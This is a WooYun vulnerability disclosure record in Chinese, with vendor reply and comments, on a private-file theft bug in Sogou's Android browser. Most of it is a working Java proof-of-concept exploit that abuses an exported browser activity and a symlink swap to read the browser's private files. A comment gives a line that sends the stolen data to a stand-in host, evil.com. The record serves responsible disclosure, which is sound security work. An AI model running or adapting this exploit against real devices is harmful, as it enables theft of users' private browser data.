{"id": 5266, "wybug_id": "wooyun-2013-047172", "wybug_title": "Android版搜狗浏览器任意私有文件窃取漏洞", "wybug_corp": "搜狗", "wybug_author": "x3xtxt", "wybug_date": "2013-12-27 16:26", "wybug_open_date": "2014-03-27 16:27", "wybug_type": "用户敏感数据泄漏", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全", "手机软件安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-27：\t细节向公众公开  简要描述： 绕过本地文件同源性策略，窃取浏览器中任意私有文件内容（此问题应该不限于搜狗浏览器，其他浏览器同样可能存在）。 详细说明：  通过符号链接绕过文件同源性策略，窃取浏览器中任意私有文件内容，详见漏洞证明代码。   漏洞证明：  \npackage com.example.x3xtxt.demo.browsers;import java.io.FileOutputStream;import android.net.Uri;import android.os.Bundle;import android.app.Activity;import android.content.ComponentName;import android.content.Context;import android.content.Intent;import android.view.Menu;import android.widget.Toast;public class MainActivity extends Activity {\t@Override\tprotected void onCreate(Bundle savedInstanceState) {\t\tsuper.onCreate(savedInstanceState);\t\tsetContentView(R.layout.activity_main);\t\t/* \t\t * 这是想要窃取的目标文件地址，作为演示，以sogou.mobile.explorer_preferences.xml为例\t\t * 实际攻击中更关注的是存放敏感信息的文件，比如databases目录下的db文件.\t\t */\t\tString sensitive_file_name = \"/data/data/sogou.mobile.explorer/shared_prefs/sogou.mobile.explorer_preferences.xml\";\t\t\t\tSoGouBrowser_ReadAnyFilePoC(sensitive_file_name);\t}\t@Override\tpublic boolean onCreateOptionsMenu(Menu menu) {\t\t// Inflate the menu; this adds items to the action bar if it is present.\t\tgetMenuInflater().inflate(R.menu.main, menu);\t\treturn true;\t}\tpublic void SoGouBrowser_ReadAnyFilePoC(String targetfile){\t\ttry{\t\t\t// 第一步，将窃取数据的shellpoc.html写入本地，确保任意App都有权访问shellpoc.html。\t\t\tString shell_poc   = \"/data/data/\"+getApplicationContext().getPackageName()+\"/files/shellpoc.html\";\t\t\t\t\t\twrite_payload_file();\t\t\tcmdexec(new String[] {\"/system/bin/chmod\", \"-R\", \"777\", shell_poc});\t\t\t\t\t\t// 第二步，调用sogou.mobile.explorer.BrowserActivity组件打开shellpoc.html文件，载入解析执行其中的JavaScript脚本，\t\t\t// JavaScript脚本中的函数延迟执行，之所以延迟执行是为了配合符号链接绕过文件同源性策略。\t\t\tString pkgName      = \"sogou.mobile.explorer\";\t\t\tString activityName = \"sogou.mobile.explorer.BrowserActivity\";\t\t\tString url          = \"file://\"+shell_poc;\t\t\t\tIntent intent = new Intent();\t\t\tintent.setAction(\"android.intent.action.VIEW\");\t\t\tintent.setComponent(new ComponentName(pkgName, activityName));\t\t\tintent.setData(Uri.parse(url));\t\t\tstartActivity(intent);\t\t\tThread.sleep(2000);\t\t\t// 第三步，当shellpoc.html被载入解析执行之后，删除shellpoc.html文件，\t\t\t// 然后创建目标私有文件(\"/data/data/sogou.mobile.explorer/shared_prefs/sogou.mobile.explorer_preferences.xml\")的符号链接，\t\t\t// 符号链接名称和shellpoc.html文件名相同，从而绕过文件同源性策略，读取私有文件的数据。\t\t\tcmdexec(new String[] {\"/system/bin/rm\", shell_poc});\t\t\tcmdexec(new String[] {\"/system/bin/ln\", \"-s\", targetfile, shell_poc});\t\t\tcmdexec(new String[] {\"/system/bin/chmod\", \"-R\", \"777\", shell_poc});\t\t\t\t\t\tThread.sleep(5000);\t\t\t\t\t\tcmdexec(new String[] {\"/system/bin/rm\", shell_poc});\t\t\t\t\t}catch(Exception e){\t\t\tdebugInfo(e.getMessage());\t\t}\t}\t@SuppressWarnings(\"deprecation\")\tpublic void write_payload_file(){\t\tString payloadStr = \"function getContent(){   \\n\" +\"  var url = location.href;                           \\n\" +\"  var xmlhttp;                                       \\n\" +\"  if(window.XMLHttpRequest){                         \\n\" +\"\txmlhttp=new XMLHttpRequest();                     \\n\" +\"  }else{                                             \\n\" +\"\txmlhttp=new ActiveXObject(\\\"Microsoft.XMLHTTP\\\"); \\n\" +\"  }                                                  \\n\" +\"                                                     \\n\" + \"  xmlhttp.onreadystatechange=function()              \\n\" +\"  {                                                  \\n\" +\"\tif (xmlhttp.readyState==4)                        \\n\" +\"\t{                                                 \\n\" +// 实际的攻击过程中只要将alert(xmlhttp.responseText)替换为// document.location.href = 'http://evil.com/receive.php?data'+encodeURIComponent(xmlhttp.responseText)// 即可。\"\t  alert(xmlhttp.responseText);                    \\n\" + \"\t}                                                 \\n\" +\"  }                                                  \\n\" +\"  xmlhttp.open(\\\"GET\\\",url,true);                    \\n\" +\"  xmlhttp.send();                                    \\n\" +\"}                                                    \\n\" +\"                                                     \\n\" + \"setTimeout(getContent,4000);                         \\n\";\t\tString htmlStr = \"<html>                                             \\n\" +                 \"<head><title>Steal Sensitive Information PoC</title></head> \\n\" + \t            \"<body>                                                      \\n\" +                \"  <script type=\\\"text/javascript\\\">                         \\n\" +                       payloadStr                                                 +\t            \"  </script>                                                 \\n\" +\t            \"</body>                                                     \\n\" +\t            \"</html>\";\t\ttry{\t\t\tFileOutputStream fOut = openFileOutput(\"shellpoc.html\", Context.MODE_WORLD_READABLE);\t\t\tfOut.write(htmlStr.getBytes());\t\t\tfOut.close();\t\t}catch(Exception e){\t\t\tdebugInfo(e.getMessage());\t\t}\t\t\t}\t\tpublic void cmdexec(String[] cmd){\t\ttry{\t\t\tRuntime.getRuntime().exec(cmd);\t\t}catch(Exception e){\t\t\tdebugInfo(e.getMessage());\t\t}\t\t\t\t\t}\t\tpublic void debugInfo(String msg){\t\tToast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show();\t}}\n   修复方案：  关于修复，请RD自行自行选择限制策略。   版权声明：转载请注明来源 x3xtxt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-12-27 16:34 厂商回复： 收到，谢谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-02 16:42 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  洞主，能教教我吗？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}